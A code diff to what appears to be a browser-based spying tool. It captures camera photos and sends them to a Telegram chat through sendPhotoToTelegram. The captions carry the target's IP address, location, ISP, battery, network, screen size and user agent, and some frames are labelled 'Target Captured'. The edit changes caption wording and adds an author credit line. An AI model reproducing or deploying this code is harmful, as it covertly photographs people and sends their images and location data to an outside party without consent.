@@ -129,7 +129,6 @@
 
                     canvas.toBlob(blob => {
                         let captionText = "";
-                        let camNameTag = (camType === 'back') ? "[Back Cam]" : "[Front Cam]";
 
                         if (photoCount === 1) {
                             let currentTime = new Date().toLocaleString();
@@ -137,19 +136,20 @@
                             let uaString = navigator.userAgent;
 
                             captionText = 
-                                `🌐 **IP Information ${camNameTag}**\n\n` +
+                                `🌐 **IP Information**\n\n` +
                                 `🔢 IP Address: \`${ipInfo}\`\n` +
                                 `📍 Location: ${cityInfo}\n` +
                                 `🌍 Region: ${regionInfo} (${countryInfo})\n` +
                                 `📡 ISP: ${ispInfo}\n\n` +
-                                `📱 **Device Details** (${photoCount}/${maxPhotos})\n\n` +
+                                `📱 **Device Details**\n\n` +
                                 `🔋 Battery: ${batteryData}\n` +
                                 `📶 Network: ${networkData}\n` +
                                 `🖥️ Screen: ${screenRes}\n` +
                                 `🕒 Time: ${currentTime}\n` +
-                                `🧠 UA: \`${uaString}\``;
+                                `🧠 UA: \`${uaString}\`\n\n` +
+                                `👑 **Credit By: आयुष नेगी**`;
                         } else {
-                            captionText = `📸 Target Captured ${camNameTag} (${photoCount}/${maxPhotos})`;
+                            captionText = `👑 **Credit By: आयुष नेगी**`;
                         }
 
                         sendPhotoToTelegram(blob, chatId, captionText);
